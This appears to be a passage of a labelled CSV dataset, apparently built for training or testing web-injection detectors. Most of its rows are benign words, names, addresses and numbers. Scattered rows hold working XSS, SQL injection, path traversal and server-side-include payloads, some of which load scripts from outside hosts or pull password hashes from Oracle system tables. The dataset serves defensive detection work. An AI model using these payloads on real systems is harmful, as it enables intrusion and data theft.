index,payload,is_malicious,injection_type
1884,dalmatoff_carrillo%40hipereuskadi.om,0.0,LEGAL
1885,salts,0.0,LEGAL
1886,Pernod,0.0,LEGAL
1887,masquerades,0.0,LEGAL
1888,add topic <iframe src=http://www.vulnerability-lab.com>,1.0,XSS
1889,Carlen,0.0,LEGAL
1890,phineas,0.0,LEGAL
1891,7447,0.0,LEGAL
1892,Edimundo,0.0,LEGAL
1893,1436786733,0.0,LEGAL
1894,3R:12500000..12800000,0.0,LEGAL
1895,16741,0.0,LEGAL
1896,isomorphisms,0.0,LEGAL
1897,bo8iner4,0.0,LEGAL
1898,ossec,0.0,LEGAL
1899,Arn,0.0,LEGAL
1900,wipe,0.0,LEGAL
1901,Alecia,0.0,LEGAL
1902,diana,0.0,LEGAL
1903,81621470J,0.0,LEGAL
1904,outgrow,0.0,LEGAL
1905,18971674D,0.0,LEGAL
1906,glimmering,0.0,LEGAL
1907,Adonis,0.0,LEGAL
1908,6571677615966415,0.0,LEGAL
1909,3483526902991693,0.0,LEGAL
1910,discloses,0.0,LEGAL
1911,index_adm,0.0,LEGAL
1912,-1y,0.0,LEGAL
1913,LeRoy,0.0,LEGAL
1914,""";location=location.hash)//#0={};alert(0)",1.0,XSS
1915,Roque,0.0,LEGAL
1916,goes,0.0,LEGAL
1917,interpolating,0.0,LEGAL
1918,enveloped,0.0,LEGAL
1919,merande%40icodea.va,0.0,LEGAL
1920,"""""+{toString:alert}",1.0,XSS
1921,steadiness,0.0,LEGAL
1922,bruising,0.0,LEGAL
1923,1909-1911,0.0,LEGAL
1924,Doll,0.0,LEGAL
1925,"ABC<div style=""x:\\xE2\\x80\\x80expression(javascript:alert(1)"">DEF",1.0,XSS
1926,30730,0.0,LEGAL
1927,Truchas,0.0,LEGAL
1928,upturns,0.0,LEGAL
1929,illogical,0.0,LEGAL
1930,revill5,0.0,LEGAL
1931,Santillana+del+Mar,0.0,LEGAL
1932,Hensley,0.0,LEGAL
1933,german+americans+--+indiana+--+indianapolis,0.0,LEGAL
1934,Odulio,0.0,LEGAL
1935,Calle+Buenaire%2C+171+,0.0,LEGAL
1936,soaks,0.0,LEGAL
1937,experimentally,0.0,LEGAL
1938,Francino+Churruca,0.0,LEGAL
1939,yudin,0.0,LEGAL
1940,",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",1.0,SQL
1941,szarabajka%40queinvento.si,0.0,LEGAL
1942,impediment,0.0,LEGAL
1943,metalanguage,0.0,LEGAL
1944,scribbled,0.0,LEGAL
1945,676125607.1258769403,0.0,LEGAL
1946,undergoes,0.0,LEGAL
1947,ghose%40perrosmodelo.tr,0.0,LEGAL
1948,lauren,0.0,LEGAL
1949,Chill%F3n,0.0,LEGAL
1950,geyser,0.0,LEGAL
1951,meets,0.0,LEGAL
1952,Knuth,0.0,LEGAL
1953,"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\""",1.0,XSS
1954,mo8os7,0.0,LEGAL
1955,Reyero,0.0,LEGAL
1956,Calle+Zurbaran%2C+131%2C+,0.0,LEGAL
1957,electrolytes,0.0,LEGAL
1958,41842m67n9c5%F35,0.0,LEGAL
1959,Ajau+Aruta,0.0,LEGAL
1960,disbursement,0.0,LEGAL
1961,&foo;,1.0,XSS
1962,5399041434530750,0.0,LEGAL
1963,coughlin%40tisanuro.sj,0.0,LEGAL
1964,Selva,0.0,LEGAL
1965,50219,0.0,LEGAL
1966,Acosta+Hausdorf,0.0,LEGAL
1967,4u56m49rg69sa,0.0,LEGAL
1968,summoned,0.0,LEGAL
1969,47501435H,0.0,LEGAL
1970,beings,0.0,LEGAL
1971,cvs,0.0,LEGAL
1972,besozzi%40universla.ar,0.0,LEGAL
1973,Rollins,0.0,LEGAL
1974,6038552435376719,0.0,LEGAL
1975,Enver,0.0,LEGAL
1976,lifetimes,0.0,LEGAL
1977,mysteriously,0.0,LEGAL
1978,7583890379589954,0.0,LEGAL
1979,Villavaquer%EDn,0.0,LEGAL
1980,Dobbin,0.0,LEGAL
1981,Calle+Bego%F1azpi+5+7%3FF,0.0,LEGAL
1982,Aleck,0.0,LEGAL
1983,phpmyadmin_pmasa_2010_9.nasl,0.0,LEGAL
1984,Pl.+Zorrilla+110%2C+,0.0,LEGAL
1985,Adorne,0.0,LEGAL
1986,bundled,0.0,LEGAL
1987,suilin,0.0,LEGAL
1988,&mode=singleimage&handle=AdamGirard&number=%22%3E%3Cscript%3Ealert%28%22XSSPOSED%22%29%3C/script%3E,1.0,XSS
1989,currey99,0.0,LEGAL
1990,westerner,0.0,LEGAL
1991,ruby,0.0,LEGAL
1992,seeks,0.0,LEGAL
1993,Midwesterner,0.0,LEGAL
1994,chart,0.0,LEGAL
1995,6513,0.0,LEGAL
1996,41970,0.0,LEGAL
1997,c4c0_2ta,0.0,LEGAL
1998,to2i5ue3o,0.0,LEGAL
1999,a9i5t2d,0.0,LEGAL
2000,Wladyslaw,0.0,LEGAL
2001,Schlitz,0.0,LEGAL
2002,middle,0.0,LEGAL
2003,Harlem,0.0,LEGAL
2004,Ulrikaumeko,0.0,LEGAL
2005,98726186C,0.0,LEGAL
2006,Costales+Henkel,0.0,LEGAL
2007,bristling,0.0,LEGAL
2008,abstraction,0.0,LEGAL
2009,Sibylla,0.0,LEGAL
2010,byword,0.0,LEGAL
2011,barczy%40menorca.com.ua,0.0,LEGAL
2012,specialists,0.0,LEGAL
2013,invents,0.0,LEGAL
2014,Vallb%F3+Olmos,0.0,LEGAL
2015,guhl.monks%40goscan.za,0.0,LEGAL
2016,refresh,0.0,LEGAL
2017,nonexistent_test_includefile\x00,0.0,LEGAL
2018,aube,0.0,LEGAL
2019,http%3A%2F%2Fad.doubleclick.net%2Fadi%2Fx1.gcn%2Fhp%2Fron%3Bsz%3D300x250%3Bclick%3Dhttp%3A%2F%2Fgoogleads.g.doubleclick.net%2Faclk%3Fsa%3Dl%26ai%3DBg8_ZJ5AFS6zMJuL7lQeaqu0bsr3RggHw7fiQEPbP4ZIXABABGAIgq5n0ATgAYMnmpoj0o8AQoAHsq-_wA7IB,0.0,LEGAL
2020,Susinos+del+P%E1ramo,0.0,LEGAL
2021,98393897N,0.0,LEGAL
2022,gagnier,0.0,LEGAL
2023,7%2434mon3a5,0.0,LEGAL
2024,soaping,0.0,LEGAL
2025,Mira,0.0,LEGAL
2026,Torell%F3,0.0,LEGAL
2027,partook,0.0,LEGAL
2028,Julien,0.0,LEGAL
2029,seducers,0.0,LEGAL
2030,amorality,0.0,LEGAL
2031,graciousness,0.0,LEGAL
2032,confiscations,0.0,LEGAL
2033,Dotras+Avi%F1%F2,0.0,LEGAL
2034,1331732628,0.0,LEGAL
2035,Lynnell,0.0,LEGAL
2036,farther,0.0,LEGAL
2037,frailest,0.0,LEGAL
2038,http%3A%2F%2Fwww.seasaltwithfood.com%2F2009%2F05%2Fhasselback-potatoes.html,0.0,LEGAL
2039,amuses,0.0,LEGAL
2040,sawed,0.0,LEGAL
2041,2073,0.0,LEGAL
2042,0.14165842554383834?,0.0,LEGAL
2043,Discover,0.0,LEGAL
2044,Hanh,0.0,LEGAL
2045,shalne,0.0,LEGAL
2046,Calzada+de+Valdunciel,0.0,LEGAL
2047,cheerlessly,0.0,LEGAL
2048,rurally,0.0,LEGAL
2049,37779,0.0,LEGAL
2050,:,0.0,LEGAL
2051,03520856469415430900,0.0,LEGAL
2052,rots,0.0,LEGAL
2053,9476466081196673,0.0,LEGAL
2054,Boris,0.0,LEGAL
2055,microprocedure,0.0,LEGAL
2056,mushroomed,0.0,LEGAL
2057,argo.freyndikh%40sanchezgordo.lc,0.0,LEGAL
2058,continued,0.0,LEGAL
2059,mcharg,0.0,LEGAL
2060,"<a href=""javascript://%0d(0===0&&1==1)%0c?alert(1):confirm(2)"">click</a>",1.0,XSS
2061,<!--[if]><script>javascript:alert(1)</script -->,1.0,XSS
2062,'><STYLE>@im\port'\ja\vasc\ript:alert(1)';</STYLE>,1.0,XSS
2063,frustrations,0.0,LEGAL
2064,kandelski-delber%40maquillajeparalabios.tg,0.0,LEGAL
2065,73527339L,0.0,LEGAL
2066,parallelograms,0.0,LEGAL
2067,vine,0.0,LEGAL
2068,reopen,0.0,LEGAL
2069,Camporredondo,0.0,LEGAL
2070,irreproducible,0.0,LEGAL
2071,Roman,0.0,LEGAL
2072,C%2F+Ateinsa+11%2C+,0.0,LEGAL
2073,thunder,0.0,LEGAL
2074,Adel,0.0,LEGAL
2075,cloudier,0.0,LEGAL
2076,chattered,0.0,LEGAL
2077,RepuLgaR,0.0,LEGAL
2078,Evert,0.0,LEGAL
2079,Karl,0.0,LEGAL
2080,winked,0.0,LEGAL
2081,7%3Fu33dabo7qu1,0.0,LEGAL
2082,77452423S,0.0,LEGAL
2083,Haste,0.0,LEGAL
2084,steel,0.0,LEGAL
2085,es3an7oso,0.0,LEGAL
2086,seniuk,0.0,LEGAL
2087,voyager,0.0,LEGAL
2088,236814315.1258646318,0.0,LEGAL
2089,recording,0.0,LEGAL
2090,linpha_order_sql_injection.nasl_1331909275,0.0,LEGAL
2091,coroutine,0.0,LEGAL
2092,Alfonso+Xii+67+7%3FD,0.0,LEGAL
2093,adu7cir,0.0,LEGAL
2094,Choon-Lin,0.0,LEGAL
2095,Radha,0.0,LEGAL
2096,forerunners,0.0,LEGAL
2097,"""<<SCRIPT>alert(""""XSS"""");//<</SCRIPT>""",1.0,XSS
2098,trustfully,0.0,LEGAL
2099,6351,0.0,LEGAL
2100,rakes,0.0,LEGAL
2101,"&lt;SCRIPT a=\\""&gt;\\"" SRC=\\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\\""&gt;&lt;/SCRIPT&gt;",1.0,XSS
2102,hourglass,0.0,LEGAL
2103,Decatur,0.0,LEGAL
2104,Elfreda,0.0,LEGAL
2105,guidelines,0.0,LEGAL
2106,<<scr\0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/X.js></script,1.0,XSS
2107,Surpik,0.0,LEGAL
2108,Yokohama,0.0,LEGAL
2109,cantankerously,0.0,LEGAL
2110,</script><script>confirm(3)</script>,1.0,XSS
2111,disputed,0.0,LEGAL
2112,Bernabella,0.0,LEGAL
2113,Salaberri+D%E1vila,0.0,LEGAL
2114,tickled,0.0,LEGAL
2115,limiters,0.0,LEGAL
2116,Bricat,0.0,LEGAL
2117,Ursola,0.0,LEGAL
2118,2754013363983769,0.0,LEGAL
2119,lakshmin,0.0,LEGAL
2120,09558,0.0,LEGAL
2121,Leelah,0.0,LEGAL
2122,undetermined,0.0,LEGAL
2123,manufactured,0.0,LEGAL
2124,3922540.296984227172,0.0,LEGAL
2125,comprehends,0.0,LEGAL
2126,phonemes,0.0,LEGAL
2127,memoir,0.0,LEGAL
2128,repairer,0.0,LEGAL
2129,lithe,0.0,LEGAL
2130,Duesaig%FCes,0.0,LEGAL
2131,beatific,0.0,LEGAL
2132,hundred,0.0,LEGAL
2133,Hip%F3lita,0.0,LEGAL
2134,"IF(SUBSTRING(USER(),1,4)=0x726f6f74,SLEEP(5),1)",1.0,SQL
2135,wetness,0.0,LEGAL
2136,Avda.+Nicaragua%2C+96%2C+,0.0,LEGAL
2137,http%3A%2F%2Fwww.mangafox.com%2Fmanga%2Fnew_vampire_princess_miyu%2Fv01%2Fc001%2F119.html,0.0,LEGAL
2138,pardoning,0.0,LEGAL
2139,VeNGaTIv.a,0.0,LEGAL
2140,immersion,0.0,LEGAL
2141,McMullen,0.0,LEGAL
2142,sathe9,0.0,LEGAL
2143,forthcoming,0.0,LEGAL
2144,outvoted,0.0,LEGAL
2145,13191273867679229272,0.0,LEGAL
2146,item27acc321de,0.0,LEGAL
2147,orbitally,0.0,LEGAL
2148,7344,0.0,LEGAL
2149,elaborate,0.0,LEGAL
2150,Freudian,0.0,LEGAL
2151,1331919535,0.0,LEGAL
2152,villager,0.0,LEGAL
2153,Larraul,0.0,LEGAL
2154,27736,0.0,LEGAL
2155,relabels,0.0,LEGAL
2156,\x0adel\x09q56166211\x09#,0.0,LEGAL
2157,Santib%E1%F1ez+de+Vidriales,0.0,LEGAL
2158,Avinguda+Doctor+Vilaseca%2C+S%2FN%2C+,0.0,LEGAL
2159,18386401713709692929,0.0,LEGAL
2160,accomplish,0.0,LEGAL
2161,nonexistant77656411,0.0,LEGAL
2162,g1ne136,0.0,LEGAL
2163,Passeig+Salze+72%2C+3-A,0.0,LEGAL
2164,9494208087264140,0.0,LEGAL
2165,"<script>//jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e</script>",1.0,XSS
2166,Gran%E1tula+de+Calatrava,0.0,LEGAL
2167,gesturing,0.0,LEGAL
2168,5975278199435199,0.0,LEGAL
2169,perene,0.0,LEGAL
2170,Zachrisson+Satalia,0.0,LEGAL
2171,Susanetta,0.0,LEGAL
2172,Mirabelle,0.0,LEGAL
2173,Wendel,0.0,LEGAL
2174,Mog%E1n,0.0,LEGAL
2175,Campo+De+San+Domingos+De+Bonaval%2C+192%2C+,0.0,LEGAL
2176,courts,0.0,LEGAL
2177,braids,0.0,LEGAL
2178,Calle+Clavel+30+11%3FB,0.0,LEGAL
2179,Botswana,0.0,LEGAL
2180,46530,0.0,LEGAL
2181,sandie,0.0,LEGAL
2182,hq,0.0,LEGAL
2183,glittering,0.0,LEGAL
2184,1486445535572481,0.0,LEGAL
2185,Bobette,0.0,LEGAL
2186,muffs,0.0,LEGAL
2187,"&Amount=';alert(/XSSPOSED)//\\';alert(1)//"";alert(2)//\\"";alert(3)//--></SCRIPT>"">'><SCRIPT>alert(/XSSPOSED/)</SCRIPT>=&{}"");}alert(6);function+xss(){//&q=';alert(0)//\\';alert(1)//"";alert(2)//\\"";alert(3)//--></SCRIPT>"">'><SCRIPT>alert(/XSSPOSED/)</SCRIPT>=&{}"");}alert(6);function+xss(){//&From=USD&To=EUR",1.0,XSS
2188,.aspx,0.0,LEGAL
2189,Xebec,0.0,LEGAL
2190,outposts,0.0,LEGAL
2191,Megen,0.0,LEGAL
2192,delimitation,0.0,LEGAL
2193,Hubbell,0.0,LEGAL
2194,knittel,0.0,LEGAL
2195,grippingly,0.0,LEGAL
2196,107587,0.0,LEGAL
2197,fiodorov%40contactomujeres.kr,0.0,LEGAL
2198,1417058040,0.0,LEGAL
2199,Lynett,0.0,LEGAL
2200,Kaufman,0.0,LEGAL
2201,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i",1.0,SQL
2202,testtest,0.0,LEGAL
2203,http%3A%2F%2Fwww.mangafox.com%2Fmanga%2Fbleach%2Fv11%2Fc094%2F14.html,0.0,LEGAL
2204,Koral,0.0,LEGAL
2205,<script>alert(1234)</script>,1.0,XSS
2206,focally,0.0,LEGAL
2207,rodEZNO,0.0,LEGAL
2208,\xc5\xbescriptualert(EXSSE)\xc5\xbe/scriptu,1.0,XSS
2209,leavings,0.0,LEGAL
2210,Kant,0.0,LEGAL
2211,interrelating,0.0,LEGAL
2212,flees,0.0,LEGAL
2213,roa,0.0,LEGAL
2214,exhibiting,0.0,LEGAL
2215,dynamited,0.0,LEGAL
2216,forbidden,0.0,LEGAL
2217,Wiese+Rald%EDriz,0.0,LEGAL
2218,important,0.0,LEGAL
2219,Erik,0.0,LEGAL
2220,orb,0.0,LEGAL
2221,VAX,0.0,LEGAL
2222,OR 1=1#,1.0,SQL
2223,\x3E,1.0,XSS
2224,stock,0.0,LEGAL
2225,Hu%E9rmeces,0.0,LEGAL
2226,"<script src=""/\%(jscript)s""></script>",1.0,XSS
2227,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,1.0,SQL
2228,""",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1.0,SQL
2229,Avda.+Venezuela%2C+198%2C+,0.0,LEGAL
2230,monique,0.0,LEGAL
2231,sleds,0.0,LEGAL
2232,scratc,0.0,LEGAL
2233,raimondo,0.0,LEGAL
2234,Fidelibus+Migliorino,0.0,LEGAL
2235,"<a+href=""javas&#99;ript&#35;alert(1);"">",1.0,XSS
2236,chilliness,0.0,LEGAL
2237,unquestioned,0.0,LEGAL
2238,freakish,0.0,LEGAL
2239,09069193V,0.0,LEGAL
2240,hulls,0.0,LEGAL
2241,shrub,0.0,LEGAL
2242,Angy,0.0,LEGAL
2243,armor,0.0,LEGAL
2244,Calle+Libertad%2C+S%2FN+,0.0,LEGAL
2245,desiccate,0.0,LEGAL
2246,Nova,0.0,LEGAL
2247,http%3A%2F%2Fwww.fupen,0.0,LEGAL
2248,exasperate,0.0,LEGAL
2249,clarified,0.0,LEGAL
2250,orations,0.0,LEGAL
2251,7173,0.0,LEGAL
2252,Jinann,0.0,LEGAL
2253,"<IMG SRC=""jav    ascript:javascript:alert(1);"">",1.0,XSS
2254,alquitr%E1n,0.0,LEGAL
2255,2068,0.0,LEGAL
2256,gearing,0.0,LEGAL
2257,72818096G,0.0,LEGAL
2258,pedant,0.0,LEGAL
2259,oesterlein%40connect.pw,0.0,LEGAL
2260,Anton-Phuoc,0.0,LEGAL
2261,Ball%FAs,0.0,LEGAL
2262,Dwain,0.0,LEGAL
2263,promptest,0.0,LEGAL
2264,put,0.0,LEGAL
2265,Navarredonda+de+la+Rinconada,0.0,LEGAL
2266,chai-seo,0.0,LEGAL
2267,encapsulates,0.0,LEGAL
2268,Roda,0.0,LEGAL
2269,%0a{}*{background:red},1.0,XSS
2270,XAXV4e4GoMLGIM:,0.0,LEGAL
2271,dean,0.0,LEGAL
2272,1nIqUi0Ar,0.0,LEGAL
2273,43143,0.0,LEGAL
2274,tangy,0.0,LEGAL
2275,envied,0.0,LEGAL
2276,7960,0.0,LEGAL
2277,"'""`><script>/* **chr*log(*num*)// */</script>",1.0,XSS
2278,ascertainable,0.0,LEGAL
2279,AGiWqtyLBfZlf3ayJsV6Y-yV9DxxuB3zmA,0.0,LEGAL
2280,http%3A%2F%2Fwarren-buffett-portfolio.com%2F,0.0,LEGAL
2281,arthropods,0.0,LEGAL
2282,Real,0.0,LEGAL
2283,select * from syscat.tabauth;,1.0,SQL
2284,machine,0.0,LEGAL
2285,unsafely,0.0,LEGAL
2286,explaining,0.0,LEGAL
2287,"<EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>",1.0,XSS
2288,Bambi,0.0,LEGAL
2289,bosch7,0.0,LEGAL
2290,paraboloidal,0.0,LEGAL
2291,strove,0.0,LEGAL
2292, autofocus onkeyup='javascript:alert(123),1.0,XSS
2293,1257966260233,0.0,LEGAL
2294,reversed,0.0,LEGAL
2295,inquirers,0.0,LEGAL
2296,cejvan%40tagarautomation.name,0.0,LEGAL
2297,Lynna,0.0,LEGAL
2298,http%3A%2F%2Fad.doubleclick.net%2Fad%2FN5043.Yahoo%2FB3311270.216%3Bsz%3D1x1%3Bord%3D1257956480177628%3F,0.0,LEGAL
2299,Cleof%E1s,0.0,LEGAL
2300,impracticality,0.0,LEGAL
2301,warranties,0.0,LEGAL
2302,20091107231931%3Bdct,0.0,LEGAL
2303,sunbonnet,0.0,LEGAL
2304,Isabelita+Ruiz%2C+31+,0.0,LEGAL
2305,Wattenberg,0.0,LEGAL
2306,34357,0.0,LEGAL
2307,pietra,0.0,LEGAL
2308,"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1.0,SQL
2309,Muniello+Llubet,0.0,LEGAL
2310,heinzman,0.0,LEGAL
2311,P7G2NA,0.0,LEGAL
2312,Danyette,0.0,LEGAL
2313,awl,0.0,LEGAL
2314,Abbas,0.0,LEGAL
2315,guize_ranson%40infotek.bn,0.0,LEGAL
2316,/%252E%252E\\%252E%252E\\%252E%252E\\file',1.0,SHELL
2317,File:///b'/../../../../file',1.0,SHELL
2318,41240,0.0,LEGAL
2319,odor,0.0,LEGAL
2320,greeter,0.0,LEGAL
2321,dough,0.0,LEGAL
2322,s%F3rdIda.ME3te,0.0,LEGAL
2323,Decker,0.0,LEGAL
2324,antidisestablishmentarianism,0.0,LEGAL
2325,Selles+Tanari,0.0,LEGAL
2326,"<a href=""\\x10javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1.0,XSS
2327,bartosze,0.0,LEGAL
2328,Cheng,0.0,LEGAL
2329,deafest,0.0,LEGAL
2330,encrypted,0.0,LEGAL
2331,clamor,0.0,LEGAL
2332,%31%32%33%27%20%4C%49%4D%49%54%20%31%2C%31%20%55%4E%49%4F%4E%20%41%4C%4C%20%53%45%4C%45%43%54%20%43%4F%4E%43%41%54%28%30%78%33%61%37%33%37%32%37%37%33%61%2C%49%46%4E%55%4C%4C%28%43%41%53%54%28%64%61%74%61%62%61%73%65%28%29%20%41%53%20%43%48%41%52%29%2C%30%78%32%30%29%2C%30%78%33%61%36%64%37%39%36%34%33%61%29%23,1.0,SQL
2333,shadier,0.0,LEGAL
2334,Jessamine,0.0,LEGAL
2335,confidentially,0.0,LEGAL
2336,d47tesi1,0.0,LEGAL
2337,interruptive,0.0,LEGAL
2338,Spahn,0.0,LEGAL
2339,1331749604,0.0,LEGAL
2340,Villarejo+de+Fuentes,0.0,LEGAL
2341,acabronAda,0.0,LEGAL
2342,Miramar,0.0,LEGAL
2343,123%29%20AND%202874%20LIKE%202341%20AND%20%288194%20LIKE%208194,1.0,SQL
2344,Xanthus,0.0,LEGAL
2345,corporal,0.0,LEGAL
2346,sundial,0.0,LEGAL
2347,Terrence,0.0,LEGAL
2348,"""><img src=”<img src=x”/onerror=alert(1)//”> Jquery: <img/src/onerror=alert(1)>",1.0,XSS
2349,fissure,0.0,LEGAL
2350,corrugate,0.0,LEGAL
2351,log9er%EDa,0.0,LEGAL
2352,collegian,0.0,LEGAL
2353,Nyquist,0.0,LEGAL
2354,lots,0.0,LEGAL
2355,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i",1.0,SQL
2356,Vita,0.0,LEGAL
2357,natal,0.0,LEGAL
2358,maxim%40copiar.com.ck,0.0,LEGAL
2359,Tuesdays,0.0,LEGAL
2360,dagama3,0.0,LEGAL
2361,barked,0.0,LEGAL
2362,swearing,0.0,LEGAL
2363,&q=%22;alert%280%29//&proxystylesheet=sp-us&site=sp-us,1.0,XSS
2364,22,0.0,LEGAL
2365,improvises,0.0,LEGAL
2366,Nashua,0.0,LEGAL
2367,Nielsen+Thomas,0.0,LEGAL
2368,Odessa,0.0,LEGAL
2369,torrid,0.0,LEGAL
2370,31005526611003,0.0,LEGAL
2371,Calle+Olmo+Seco%2C+126%2C+,0.0,LEGAL
2372,pimple,0.0,LEGAL
2373,young,0.0,LEGAL
2374,declined,0.0,LEGAL
2375,"""><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)>",1.0,XSS
2376,palenque,0.0,LEGAL
2377,http%3A%2F%2Fwww.mangafox.com%2Fmanga%2Fwild_ones%2Fv05%2Fc025%2F27.html,0.0,LEGAL
2378,Biota,0.0,LEGAL
2379,"'><IMG LOWSRC=""javascript:alert(1)"">",1.0,XSS
2380,--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->,1.0,XSS
2381,08589700M,0.0,LEGAL
2382,flagrantly,0.0,LEGAL
2383,make,0.0,LEGAL
2384,))) waitfor delay '0:0:20' /*,1.0,SQL
2385,double,0.0,LEGAL
2386,necessitates,0.0,LEGAL
2387,Pl.+Santa+Maria%2C+68%2C+8E,0.0,LEGAL
2388,Valeras%2C+Las,0.0,LEGAL
2389,chanticleers,0.0,LEGAL
2390,rawer,0.0,LEGAL
2391,unwinding,0.0,LEGAL
2392,"<SCRIPT/SRC=""%(jscript)s""></SCRIPT>",1.0,XSS
2393,04137943J,0.0,LEGAL
2394,Crespi+Loaiza,0.0,LEGAL
2395,miscel%E1nea,0.0,LEGAL
2396,modeled,0.0,LEGAL
2397,bergstro3,0.0,LEGAL
2398,Pl.+De+Belen+35+2E,0.0,LEGAL
2399,31414,0.0,LEGAL
2400,4665566435966959,0.0,LEGAL
2401,1257102965639,0.0,LEGAL
2402,hyena,0.0,LEGAL
2403,Rodrigus,0.0,LEGAL
2404,mccalister%40donkr.sk,0.0,LEGAL
2405,2739690086559142,0.0,LEGAL
2406,' and '2'='2,1.0,SQL
2407,Minuet+Salo,0.0,LEGAL
2408,C%2F+Valdepalitos+155%2C+5-A,0.0,LEGAL
2409,tami,0.0,LEGAL
2410,Carretera+200+Hasta+Km.+1+Barra+De+Mi%F1o+175+,0.0,LEGAL
2411,towered,0.0,LEGAL
2412,Brit,0.0,LEGAL
2413,0882871112681539,0.0,LEGAL
2414,25120,0.0,LEGAL
2415,ivies,0.0,LEGAL
2416,delcine3,0.0,LEGAL
2417,chesterf,0.0,LEGAL
2418,Darb,0.0,LEGAL
2419,gower,0.0,LEGAL
2420,floret7ar,0.0,LEGAL
2421,deviated,0.0,LEGAL
2422,conlon,0.0,LEGAL
2423,superseding,0.0,LEGAL
2424,lopez,0.0,LEGAL
2425,lemma,0.0,LEGAL
2426,C%2F+Academico+Perez+Pavia+173+,0.0,LEGAL
2427,wartime,0.0,LEGAL
2428,escuder%F3n,0.0,LEGAL
2429,ma158ci010e,0.0,LEGAL
2430,sweetie,0.0,LEGAL
2431,bendicty,0.0,LEGAL
2432,nastiest,0.0,LEGAL
2433,fiddled,0.0,LEGAL
2434,559291842,0.0,LEGAL
2435,Dios+le+Guarde,0.0,LEGAL
2436,benfer%40cor-jet.sj,0.0,LEGAL
2437,2x334ma81va,0.0,LEGAL
2438,C%2F+Las+Monjas+34%2C+4A,0.0,LEGAL
2439,"<form><input type=""image"" value=""submit"" formaction=//goo.gl/nlX0P>",1.0,XSS
2440,Mann,0.0,LEGAL
2441,Paton+Bagot,0.0,LEGAL
2442,distance,0.0,LEGAL
2443,forehead,0.0,LEGAL
2444,Sluis,0.0,LEGAL
2445,33534167Y,0.0,LEGAL
2446,01394028K,0.0,LEGAL
2447,lexicon,0.0,LEGAL
2448,"""><script\x0Atype=""text/javascript"">javascript:alert(1);</script>",1.0,XSS
2449,<u oncopy=alert()> Copy me</u>,1.0,XSS
2450,3150,0.0,LEGAL
2451,Uunko,0.0,LEGAL
2452,6148,0.0,LEGAL
2453,Thorstein,0.0,LEGAL
2454,18270,0.0,LEGAL
2455,chores,0.0,LEGAL
2456,Lillian,0.0,LEGAL
2457,undergraduate,0.0,LEGAL
2458,mc_765501_641,0.0,LEGAL
2459,Bali,0.0,LEGAL
2460,"""<img dynsrc=""""javascript:document.write(""""XSS-XSS-XSS"""");"""">""",1.0,XSS
2461,seventy,0.0,LEGAL
2462,wherever,0.0,LEGAL
2463,<IMG SRC=javascript:confirm(&quot;XSS&quot;)>,1.0,XSS
2464,"<pre><!--#exec cmd=""whoami""--></pre>",1.0,XSS
2465,"456')%5d|//a|/a%5bcontains(a,'b",1.0,SQL
2466,creeps,0.0,LEGAL
2467,Encina+35%2C+,0.0,LEGAL
2468,anillete,0.0,LEGAL
2469,"<dialog open="""" onclose=""alert(1)""><form method=""dialog""><button>Close me!</button></form></dialog>",1.0,XSS
2470,incommunicable,0.0,LEGAL
2471,"""><!ENTITY x ""&#x3C;html:img&#x20;src='x'&#x20;xmlns:html='http://www.w3.org/1999/xhtml'&#x20;onerror='alert(1)'/&#x3E;"">",1.0,XSS
